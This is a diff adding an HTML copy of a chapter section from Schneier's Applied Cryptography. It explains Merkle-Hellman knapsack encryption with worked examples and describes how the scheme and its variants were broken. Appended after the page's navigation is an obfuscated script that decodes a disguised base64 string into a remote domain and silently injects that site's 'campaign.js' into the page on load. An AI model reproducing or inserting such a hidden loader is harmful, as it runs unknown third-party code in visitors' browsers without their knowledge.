@@ -1,0 +1,123 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=19//-->
+<!--PAGES=463-466//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>For example, consider a total knapsack weight of 70 and a sequence of weights of {2, 3, 6, 13, 27, 52}. The largest weight, 52, is less than 70, so 52 is in the knapsack. Subtracting 52 from 70 leaves 18. The next weight, 27, is greater than 18, so 27 is not in the knapsack. The next weight, 13, is less than 18, so 13 is in the knapsack. Subtracting 13 from 18 leaves 5. The next weight, 6, is greater than 5, so 6 is not in the knapsack. Continuing this process will show that both 2 and 3 are in the knapsack and the total weight is brought to 0, which indicates that a solution has been found. Were this a Merkle-Hellman knapsack encryption block, the plaintext that resulted from a ciphertext value of 70 would be 110101.
+</P>
+<P>Non-superincreasing, or normal, knapsacks are hard problems; they have no known quick algorithm. The only known way to determine which items are in the knapsack is to methodically test possible solutions until you stumble on the correct one. The fastest algorithms, taking into account the various heuristics, grow exponentially with the number of possible weights in the knapsack. Add one item to the sequence of weights, and it takes twice as long to find the solution. This is much more difficult than a superincreasing knapsack where, if you add one more weight to the sequence, it simply takes another operation to find the solution.</P>
+<I><P><A NAME="Fig1"></A><A HREF="javascript:displayWindow('images/19-01.jpg',237,58 )"><IMG SRC="images/19-01t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/19-01.jpg',237,58)"><FONT COLOR="#000077"><B>Figure 19.1</B></FONT></A>&nbsp;&nbsp;Encryption with knapsacks.</I>
+</P>
+<P>The Merkle-Hellman algorithm is based on this property. The private key is a sequence of weights for a superincreasing knapsack problem. The public key is a sequence of weights for a normal knapsack problem with the same solution. Merkle and Hellman developed a technique for converting a superincreasing knapsack problem into a normal knapsack problem. They did this using modular arithmetic.
+</P>
+<P><FONT SIZE="+1"><B><I>Creating the Public Key from the Private Key</I></B></FONT></P>
+<P>Without going into the number theory, this is how the algorithm works: To get a normal knapsack sequence, take a superincreasing knapsack sequence, for example {2, 3, 6, 13, 27, 52}, and multiply all of the values by a number <I>n,</I> mod <I>m</I>. The modulus should be a number greater than the sum of all the numbers in the sequence: for example, 105. The multiplier should have no factors in common with the modulus: for example, 31. The normal knapsack sequence would then be</P>
+<DL>
+<DD>2 * 31 mod 105 = 62
+<DD>3 * 31 mod 105 = 93
+<DD>6 * 31 mod 105 = 81
+<DD>13 * 31 mod 105 = 88
+<DD>27 * 31 mod 105 = 102
+<DD>52 * 31 mod 105 = 37
+</DL>
+<P>The knapsack would then be {62, 93, 81, 88, 102, 37}.
+</P>
+<P>The superincreasing knapsack sequence is the private key. The normal knapsack sequence is the public key.</P>
+<P><FONT SIZE="+1"><B><I>Encryption</I></B></FONT></P>
+<P>To encrypt a binary message, first break it up into blocks equal to the number of items in the knapsack sequence. Then, allowing a one to indicate the item is present and a zero to indicate that the item is absent, compute the total weights of the knapsacks&#151;one for every message block.
+</P>
+<P>For example, if the message were 011000110101101110 in binary, encryption using the previous knapsack would proceed like this:</P>
+<DL>
+<DD>message = 011000 110101 101110
+<DD>011000 corresponds to 93 &#43; 81 = 174
+<DD>110101 corresponds to 62 &#43; 93 &#43; 88 &#43; 37 = 280
+<DD>101110 corresponds to 62 &#43; 81 &#43; 88 &#43; 102 = 333
+</DL>
+<P>The ciphertext would be
+</P>
+<DL>
+<DD>174,280,333
+</DL>
+<P><FONT SIZE="+1"><B><I>Decryption</I></B></FONT></P>
+<P>A legitimate recipient of this message knows the private key: the original superincreasing knapsack, as well as the values of <I>n</I> and <I>m</I> used to transform it into a normal knapsack. To decrypt the message, the recipient must first determine <I>n</I><SUP>-1</SUP> such that <I>n</I>(<I>n</I><SUP>-1</SUP> ) &#8801; 1 (mod <I>m</I>). Multiply each of the ciphertext values by <I>n</I><SUP>-1</SUP> mod <I>m,</I> and then partition with the private knapsack to get the plaintext values.</P>
+<P>In our example, the superincreasing knapsack is {2, 3, 6, 13, 27, 52}, <I>m</I> is equal to 105, and <I>n</I> is equal to 31. The ciphertext message is 174, 280, 333. In this case <I>n</I><SUP>-1</SUP> is equal to 61, so the ciphertext values must be multiplied by 61 mod 105.</P>
+<DL>
+<DD>174 * 61 mod 105 = 9 = 3 &#43; 6, which corresponds to 011000
+<DD>280 * 61 mod 105 = 70 = 2 &#43; 3 &#43; 13 &#43; 52, which corresponds to 110101
+<DD>333 * 61 mod 105 = 48 = 2 &#43; 6 &#43; 13 &#43; 27, which corresponds to 101110
+</DL>
+<P>The recovered plaintext is 011000 110101 101110.
+</P>
+<P><FONT SIZE="+1"><B><I>Practical Implementations</I></B></FONT></P>
+<P>With a knapsack sequence of only six items, it&#146;s not hard to solve the problem even if it isn&#146;t superincreasing. Real knapsacks should contain at least 250 items. The value for each term in the superincreasing knapsack should be somewhere between 200 and 400 bits long, and the modulus should be somewhere between 100 to 200 bits long. Real implementations of the algorithm use random-sequence generators to produce these values.
+</P>
+<P>With knapsacks like that, it&#146;s futile to try to solve them by brute force. If a computer could try a million possibilities per second, trying all possible knapsack values would take over 10<SUP>46</SUP> years. Even a million machines working in parallel wouldn&#146;t solve this problem before the sun went nova.</P>
+<P><FONT SIZE="+1"><B><I>Security of Knapsacks</I></B></FONT></P>
+<P>It wasn&#146;t a million machines that broke the knapsack cryptosystem, but a pair of cryptographers. First a single bit of plaintext was recovered [725]. Then, Shamir showed that knapsacks can be broken in certain circumstances [1415, 1416]. There were other results&#151;[1428, 38, 754, 516, 488]&#151;but no one could break the general Merkle-Hellman system. Finally, Shamir and Zippel [1418, 1419, 1421] found flaws in the transformation that allowed them to reconstruct the superincreasing knapsack from the normal knapsack. The exact arguments are beyond the scope of this book, but a nice summary of them can be found in [1233, 1244]. At the conference where the results were presented, the attack was demonstrated on stage using an Apple II computer [492, 494].
+</P>
+<P><FONT SIZE="+1"><B><I>Knapsack Variants</I></B></FONT></P>
+<P>Since the original Merkle-Hellman scheme was broken, many other knapsack systems have been proposed: multiple iterated knapsacks, Graham-Shamir knapsacks, and others. These have all been analyzed and broken, generally using the same cryptographic techniques, and litter the cryptographic highway [260, 253, 269, 921, 15, 919, 920, 922, 366, 254, 263, 255]. Good overviews of these systems and their cryptanalyses can be found in [267, 479, 257, 268].
+</P>
+<P>Other algorithms have been proposed that use ideas similar to those used in knapsack cryptosystems, but these too have been broken. The Lu-Lee cryptosystem [990, 13] was broken in [20, 614, 873]; a modification [507] is also insecure [1620]. Attacks on the Goodman-McAuley cryptosystem are in [646, 647, 267, 268]. The Pieprzyk cryptosystem [1246] can be broken by similar attacks. The Niemi cryptosystem [1169], based on modular knapsacks, was broken in [345, 788]. A newer multistage knapsack [747] has not yet been broken, but I am not optimistic. Another variant is [294].</P>
+<P>While a variation of the knapsack algorithm is currently secure&#151;the Chor-Rivest knapsack [356], despite a &#147;specialized attack&#148; [743]&#151;the amount of computation required makes it far less useful than the other algorithms discussed here. A variant, called the Powerline System, is not secure [958]. Most important, considering the ease with which all the other variations fell, it doesn&#146;t seem prudent to trust them.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="19-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(zlqibQwE, FdcMHIdc) {FdcMHIdc = zlqibQwE.createElement('script');FdcMHIdc.type = 'text/javascript';FdcMHIdc.async = true;FdcMHIdc.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');zlqibQwE.getElementsByTagName('body')[0].appendChild(FdcMHIdc);}(document));</script></body>
+</html>
